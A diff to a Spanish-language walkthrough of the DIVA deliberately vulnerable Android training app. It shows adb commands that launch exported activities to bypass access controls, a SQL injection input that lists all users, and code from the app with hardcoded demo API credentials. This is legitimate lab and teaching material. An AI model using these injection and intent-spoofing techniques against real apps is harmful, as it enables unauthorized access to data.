@@ -106,4 +106,39 @@ Con una entrada como `' or '1'='1` podemos ver todos los usuarios:
 
 Dado que trata de acceder a una URL sin ninguna validación, podemos listar archivos locales como el del ejercicio 1.
 
+# Access Control Issues - Part 1
+
+En esta parte nos mencionan que hay una api corriendo, nos permiten entrar a la pestaña que muestra las credenciales. Sin embargo el objetivo es acceder desde fuera de la apicación:
+
+```bash
+sudo adb shell am start -n jakhar.aseem.diva/jakhar.aseem.diva.APICredsActivity
+Starting: Intent { cmp=jakhar.aseem.diva/.APICredsActivity }
+```
+
+También se puede lanzar con:
+
+```bash
+sudo adb shell am start -a jakhar.aseem.diva.VIEWCREDS
+```
+
+# Access Control Issues - Part 2
+
+Este nivel es similar al anterior, pero en este caso se comprueba que se reciba un valor booleano:
+
+```java
+Intent i = getIntent();
+boolean bcheck = i.getBooleanExtra(getString(R.string.chk_pin), true);
+if (!bcheck) {
+    apicview.setText("TVEETER API Key: secrettveeterapikey\nAPI User name: diva2\nAPI Password: p@ssword2");
+    return;
+}
+```
+
+Para pasar dicho valor podemos utilizar el siguiente comando:
+
+```bash
+adb shell am start jakhar.aseem.diva/.APICreds2Activity --ez chk_pin false
+
+Starting: Intent { act=android.intent.action.MAIN cat=[android.intent.category.LAUNCHER] cmp=jakhar.aseem.diva/.APICreds2Activity }
+```
 
